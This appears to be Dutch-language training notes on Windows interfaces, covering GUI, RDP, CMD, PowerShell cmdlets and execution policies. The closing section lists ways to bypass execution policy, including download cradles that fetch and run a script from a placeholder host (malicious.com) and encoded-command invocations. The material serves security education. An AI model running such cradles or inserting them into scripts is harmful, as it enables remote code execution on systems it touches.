## 🖥️ Graphical User Interface (GUI)

Het concept van een **graphical user interface (GUI)** werd in de late jaren 1970 geïntroduceerd door het **Xerox Palo Alto research laboratory**. Het werd toegevoegd aan Apple en Microsoft besturingssystemen om **usability concerns** aan te pakken voor everyday users die waarschijnlijk moeite zouden hebben met het navigeren via de command line.

::note
**GUI Toegankelijkheid:**
De meeste casual Windows gebruikers hoeven nooit met het besturingssysteem te interacteren via de command line. Een GUI biedt users een **interactieve point-and-click interface** voor het werken met het besturingssysteem en geïnstalleerde applicaties en services.
::

### Impact van de GUI

De introductie van de GUI opende **wijdverspreide toegang** tot computers voor veel verschillende doelgroepen, omdat gebruikers met hun computer konden werken zonder:
- Commands te hoeven onthouden
- Een programmeertaal te kennen
- Technische expertise te bezitten

::tip
**System Administrator Gebruik:**
System administrators gebruiken vaak GUI-based systemen voor:
- **Active Directory** beheer
- **IIS (Internet Information Services)** configuratie
- **Database** interactie via tools zoals SQL Server Management Studio
- **Group Policy** management console
::

## 🔗 Remote Desktop Protocol (RDP)

**RDP** is een proprietary Microsoft protocol waarmee een user kan verbinden met een remote systeem over een netwerkverbinding en een **graphical user interface** kan verkrijgen.

### RDP Technische Details

| Aspect | Details |
|--------|---------|
| **Protocol** | Proprietary Microsoft protocol |
| **Port** | **TCP 3389** (standaard) |
| **Client** | RDP client software (mstsc.exe, Remote Desktop Connection) |
| **Server** | RDP server software (Terminal Services, Remote Desktop Services) |
| **Data Channel** | Dedicated network channel voor bidirectionele communicatie |

::important
**RDP Functionaliteit:**
- User verbindt via **RDP client software** naar een target systeem met **RDP server software**
- RDP gebruikt **port 3389** om een dedicated network channel te openen voor data transfer
- Bij verbinding via RDP krijgt de user toegang tot de **GUI alsof ze fysiek achter de computer zitten**

## 💻 Windows Command Line

Command-line interfaces geven gebruikers **grotere controle** over hun systemen en kunnen gebruikt worden voor een breed scala aan dagelijkse, administratieve en troubleshooting taken.

::note
**Voordelen van Command Line:**
- **Automation** — Introduceer automatisering voor repetitieve taken (bijv. bulk user creation in domain)
- **Scripting** — Complexe workflows automatiseren
- **Remote management** — Beheer systemen zonder GUI overhead
- **Granulaire controle** — Toegang tot functies niet beschikbaar in GUI
::

1. **Command Prompt (CMD)**

## 📟 Command Prompt (CMD)

De **Command Prompt** (`cmd.exe`) wordt gebruikt om commands in te voeren en uit te voeren. Een user kan:
- **One-off commands** uitvoeren (bijv. `ipconfig` voor IP address informatie)
- **Advanced tasks** uitvoeren (scheduled tasks, scripts, batch files)

### CMD Openen

**Verschillende methoden:**
- **Start Menu** — Type "cmd" in search
- **Run dialogue** — `Win + R` → type "cmd"
- **Direct launch** — Navigeer naar `C:\Windows\System32\cmd.exe`
- **File Explorer** — Type "cmd" in address bar van huidige folder

## ⚡ PowerShell

**Windows PowerShell** is een command shell ontworpen door Microsoft, specifiek gericht op **system administrators**. PowerShell heeft:
- Een **interactive command prompt**
- Een **krachtige scripting environment**

::important
**PowerShell Architecture:**
PowerShell is gebouwd bovenop het **.NET Framework**, dat gebruikt wordt voor het bouwen en draaien van applicaties op Windows. Dit maakt het een **zeer krachtige tool** voor directe interface met het besturingssysteem.
::

### PowerShell vs. CMD

Net als de command prompt geeft PowerShell directe toegang tot het file system, en we kunnen de **meerderheid van dezelfde commands** draaien die we binnen een CMD shell kunnen uitvoeren.

**Echter, PowerShell biedt:**
- **Object-oriented output** (niet alleen text)
- **Extensive scripting capabilities**
- **.NET integration**
- **Remote management** via remoting
- **Modules en extensibility**

## 🔧 PowerShell Cmdlets

PowerShell gebruikt **[cmdlets](https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.5&viewFallbackFrom=powershell-7)** (uitgesproken als "command-lets"), kleine **single-function tools** ingebouwd in de shell.

::note
**Cmdlet Availability:**
- **100+ core cmdlets** in standaard PowerShell
- **Duizenden additional cmdlets** via modules
- **Custom cmdlets** kunnen worden geschreven door users
::

### Cmdlet Naming Convention

Cmdlets volgen de **Verb-Noun** naming convention:

| Cmdlet | Verb | Noun | Functie |
|--------|------|------|---------|
| **Get-ChildItem** | Get | ChildItem | Lijst directory contents |
| **Set-Location** | Set | Location | Change directory |
| **Get-Process** | Get | Process | List running processen |
| **Stop-Service** | Stop | Service | Stop een service |
| **New-Item** | New | Item | Create nieuwe file/folder |

### Cmdlet Parameters

Cmdlets accepteren **arguments** of **flags**. We kunnen `<cmdlet> -` typen en **Tab** drukken om door parameters te itereren.

**Voorbeelden:**

```powershell
# Recursief directory listing
Get-ChildItem -Recurse

# Specifiek path opgeven
Get-ChildItem -Path C:\Users\Administrator\Documents

# Gecombineerde parameters
Get-ChildItem -Path C:\Users\Administrator\Downloads -Recurse
```

## 🔒 PowerShell Execution Policy

Soms kunnen we **geen scripts uitvoeren** op een systeem. Dit komt door een security feature genaamd de **execution policy**, die probeert de uitvoering van **malicious scripts** te voorkomen.

### Execution Policy Types

| Policy | Beschrijving |
|--------|--------------|
| **AllSigned** | Alle scripts kunnen draaien, maar moeten signed zijn door trusted publisher. Geldt voor zowel remote als local scripts. Prompt voor scripts van publishers nog niet als trusted/untrusted gemarkeerd. |
| **Bypass** | Geen scripts of configuration files worden geblokkeerd. User krijgt **geen warnings of prompts**. |
| **Default** | Standaard execution policy: **Restricted** voor Windows desktops, **RemoteSigned** voor Windows servers. |
| **RemoteSigned** | Scripts kunnen draaien maar vereisen **digital signature** voor scripts gedownload van internet. Lokaal geschreven scripts vereisen geen signature. |
| **Restricted** | Staat **individual commands** toe maar blokkeert scripts. Alle script file types geblokkeerd: `.ps1`, `.ps1xml`, `.psm1`. |
| **Undefined** | Geen execution policy ingesteld voor de current scope. Als **alle scopes** undefined zijn, dan wordt **Restricted** gebruikt. |
| **Unrestricted** | Standaard policy voor **non-Windows computers**. Staat unsigned scripts toe maar waarschuwt voor scripts niet van local intranet zone. |

### Current Execution Policy Bekijken

```powershell
PS C:\htb> Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned
```

### Execution Policy Scopes

| Scope | Beschrijving |
|-------|--------------|
| **MachinePolicy** | Set via Group Policy voor alle users |
| **UserPolicy** | Set via Group Policy voor current user |
| **Process** | Alleen voor current PowerShell session |
| **CurrentUser** | Voor current user |
| **LocalMachine** | Voor alle users op de machine |

## 🚫 Execution Policy Bypasses

::important
**Security Limitation:**
De execution policy is **NIET bedoeld als security control** die user actions beperkt. Het is een **safety feature**, geen security boundary.
::

Een user kan de policy **eenvoudig omzeilen** door:

### 1. Script Content Direct Typen

Kopieer script content en plak in PowerShell window.

### 2. Download en Invoke

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')
```

### 3. Encoded Command

```powershell
powershell.exe -EncodedCommand <base64_encoded_script>
```

### 4. Policy Aanpassen voor Current Process

```powershell
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic.
Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): Y
```

**Resultaat:**
```powershell
PS C:\htb> Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process          Bypass
  CurrentUser       Undefined
 LocalMachine    RemoteSigned
```

::warning
**Security Implication:**
Het wijzigen van de execution policy voor de **Process scope** kan door **vrijwel elke user** worden gedaan, omdat het:
- Geen **configuration change** vereist
- Alleen voor de **duur van de user's session** geldt
- Geen **administrative privileges** nodig heeft
::

### 5. Alternative Bypass Methods

```powershell
# Bypass via command line parameter
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Bypass via stdin
Get-Content script.ps1 | powershell.exe -noprofile -

# Bypass via download cradle zonder disk write
IEX (iwr 'http://malicious.com/script.ps1')
```
